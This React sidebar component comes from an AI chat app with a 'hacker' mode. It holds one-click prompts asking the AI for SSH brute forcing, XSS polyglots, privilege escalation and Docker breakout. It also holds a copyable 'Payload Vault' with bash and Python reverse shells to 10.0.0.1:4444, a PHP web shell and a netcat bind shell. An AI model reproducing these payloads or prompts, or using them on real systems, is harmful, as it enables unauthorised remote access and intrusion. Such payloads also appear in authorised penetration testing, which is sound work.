
import React, { useState } from 'react';
import { AppMode } from '../types';

interface SidebarProps {
  mode: AppMode;
  setMode: (mode: AppMode) => void;
  clearChat: () => void;
  onCloseMobile: () => void;
  onStartLive: () => void;
  onOpenToolkit: () => void;
  onQuickCommand: (cmd: string) => void;
}

export const Sidebar: React.FC<SidebarProps> = ({ mode, setMode, clearChat, onCloseMobile, onStartLive, onOpenToolkit, onQuickCommand }) => {
  const isHacker = mode === 'hacker';
  const [showPayloads, setShowPayloads] = useState(false);

  const attackVectors = [
      { name: 'Auto Recon (Network)', cmd: 'Generate a script to automate network reconnaissance for 192.168.1.0/24 using nmap and masscan.' },
      { name: 'Brute Force SSH', cmd: 'Provide a Hydra command to brute force SSH on a target IP using a user list and rockyou.txt.' },
      { name: 'XSS Polyglots', cmd: 'Generate a list of polyglot XSS payloads for testing a search bar input.' },
      { name: 'Win PrivEsc Check', cmd: 'Provide a PowerShell command to check for common Windows privilege escalation vectors.' },
      { name: 'Subdomain Enum', cmd: 'Generate a python script to enumerate subdomains using crt.sh API.' },
      { name: 'Docker Escape', cmd: 'Explain and provide commands for testing Docker container breakout via mounted socket.' },
  ];

  const commonPayloads = [
      { name: 'BASH Reverse Shell', code: 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' },
      { name: 'Python Reverse Shell', code: 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'' },
      { name: 'PHP Web Shell', code: '<?php system($_GET["cmd"]); ?>' },
      { name: 'Netcat Bind Shell', code: 'nc -lvp 4444 -e /bin/bash' }
  ];

  const copyPayload = (code: string) => {
      navigator.clipboard.writeText(code);
      alert("Payload copied to clipboard!");
  };

  return (
    <div className={`h-full w-64 flex flex-col border-r transition-colors duration-300 ${
      isHacker 
        ? 'bg-black border-cyber-matrix/30 text-cyber-matrix' 
        : 'bg-cyber-900 border-white/10 text-gray-300'
    }`}>
      {/* Header */}
      <div className="p-6 border-b border-white/5 flex justify-between items-center">
        <h1 className={`text-xl font-bold tracking-wider ${isHacker ? 'glitch-text' : ''}`}>
          <i className={`fas ${isHacker ? 'fa-terminal' : 'fa-cube'} mr-2`}></i>
          {isHacker ? 'ACTIVE_' : 'OMNI'}
          <span className={isHacker ? 'text-white bg-cyber-matrix px-1 text-black' : 'text-cyber-neon'}>
            {isHacker ? 'RAJAB' : 'MIND'}
          </span>
        </h1>
        <button onClick={onCloseMobile} className="md:hidden">
          <i className="fas fa-times"></i>
        </button>
      </div>

      {/* Navigation */}
      <div className="flex-1 p-4 space-y-2 overflow-y-auto custom-scrollbar">
        
        {/* VOICE UPLINK BUTTON */}
        <button 
          onClick={onStartLive}
          className={`w-full text-left p-3 rounded-lg flex items-center gap-3 transition-all mb-2 border ${
            isHacker 
              ? 'bg-red-900/20 border-red-500/50 text-red-400 hover:bg-red-900/40 animate-pulse' 
              : 'bg-blue-900/20 border-blue-500/30 text-blue-300 hover:bg-blue-900/30'
          }`}
        >
          <i className="fas fa-microphone-lines w-5 text-center"></i>
          <span className="font-bold">{isHacker ? 'SECURE_VOICE_UPLINK' : 'Live Voice Chat'}</span>
        </button>

        {/* TOOLKIT BUTTON (NEW) */}
        {isHacker && (
          <button 
            onClick={onOpenToolkit}
            className="w-full text-left p-3 rounded-lg flex items-center gap-3 transition-all mb-4 border bg-cyber-matrix/10 border-cyber-matrix text-cyber-matrix hover:bg-cyber-matrix hover:text-black shadow-[0_0_10px_rgba(0,255,65,0.2)]"
          >
            <i className="fas fa-dragon w-5 text-center"></i>
            <span className="font-bold">OPEN_WARFARE_TOOLKIT</span>
          </button>
        )}

        {/* HACKER TOOLS SECTION */}
        {isHacker && (
            <div className="mb-6">
                <div className="text-xs font-bold uppercase tracking-widest opacity-70 mb-3 ml-2 text-red-500">Quick Vectors</div>
                <div className="space-y-1 mb-4">
                    {attackVectors.map((tool, idx) => (
                        <button
                            key={idx}
                            onClick={() => {
                                onQuickCommand(tool.cmd);
                                onCloseMobile();
                            }}
                            className="w-full text-left p-2 rounded-sm text-xs font-mono border border-cyber-matrix/30 hover:bg-cyber-matrix hover:text-black transition-colors flex items-center gap-2"
                        >
                            <i className="fas fa-caret-right"></i> {tool.name}
                        </button>
                    ))}
                </div>
                
                <button 
                    onClick={() => setShowPayloads(!showPayloads)}
                    className="text-xs font-bold uppercase tracking-widest opacity-70 mb-2 ml-2 text-yellow-500 flex justify-between w-full pr-4"
                >
                    <span>Payload Vault</span>
                    <i className={`fas ${showPayloads ? 'fa-chevron-down' : 'fa-chevron-right'}`}></i>
                </button>
                
                {showPayloads && (
                    <div className="space-y-2 pl-2 border-l border-yellow-500/30 ml-1">
                        {commonPayloads.map((pl, idx) => (
                            <div key={idx} className="group relative">
                                <div className="text-[10px] text-gray-400 mb-1">{pl.name}</div>
                                <div 
                                    onClick={() => copyPayload(pl.code)}
                                    className="bg-gray-900 p-2 rounded border border-gray-700 text-[10px] font-mono text-green-400 truncate cursor-pointer hover:border-green-500 hover:bg-black transition-colors"
                                    title="Click to Copy"
                                >
                                    {pl.code}
                                </div>
                            </div>
                        ))}
                    </div>
                )}
            </div>
        )}

        <div className="text-xs font-bold uppercase tracking-widest opacity-50 mb-4 ml-2">Modules</div>

        <button className={`w-full text-left p-3 rounded-lg flex items-center gap-3 transition-all ${
          isHacker ? 'hover:bg-cyber-matrix/20 hover:shadow-[0_0_10px_rgba(0,255,65,0.2)]' : 'hover:bg-white/5'
        }`}>
          <i className="fas fa-comment-alt w-5 text-center"></i>
          <span>{isHacker ? 'SECURE_COMM' : 'Chat Stream'}</span>
        </button>
        
        <button className={`w-full text-left p-3 rounded-lg flex items-center gap-3 transition-all ${
          isHacker ? 'hover:bg-cyber-matrix/20' : 'hover:bg-white/5'
        }`}>
          <i className="fas fa-code w-5 text-center"></i>
          <span>{isHacker ? 'EXPLOIT_GEN' : 'Code Generator'}</span>
        </button>
      </div>

      {/* Actions */}
      <div className="p-4 border-t border-white/5 space-y-4">
        <div className={`p-3 rounded-lg border ${isHacker ? 'border-cyber-matrix bg-cyber-matrix/5' : 'border-gray-700 bg-gray-800/50'}`}>
          <div className="flex justify-between items-center mb-2">
            <span className="text-xs uppercase font-bold">Status</span>
            <span className={`text-xs px-2 py-0.5 rounded ${isHacker ? 'bg-red-600 text-white animate-pulse' : 'bg-blue-600 text-white'}`}>
              {isHacker ? 'ROOT' : 'USER'}
            </span>
          </div>
          <div className="flex gap-1">
            <button 
              onClick={() => setMode('standard')}
              className={`flex-1 py-1 text-xs rounded ${!isHacker ? 'bg-white text-black' : 'hover:bg-white/10'}`}
            >
              STD
            </button>
            <button 
              onClick={() => setMode('hacker')}
              className={`flex-1 py-1 text-xs rounded ${isHacker ? 'bg-cyber-matrix text-black font-bold' : 'hover:bg-white/10'}`}
            >
              ADV
            </button>
          </div>
        </div>

        <button 
          onClick={clearChat}
          className="w-full p-2 text-sm text-red-400 hover:text-red-300 hover:bg-red-900/20 rounded transition-colors flex items-center justify-center gap-2"
        >
          <i className="fas fa-trash"></i>
          {isHacker ? 'WIPE_LOGS' : 'Wipe Memory'}
        </button>
        
        <div className="text-[10px] text-center opacity-30">
          v2.6.0 // {isHacker ? 'RAJAB_OS' : 'GEMINI_CORE'}
        </div>
      </div>
    </div>
  );
};
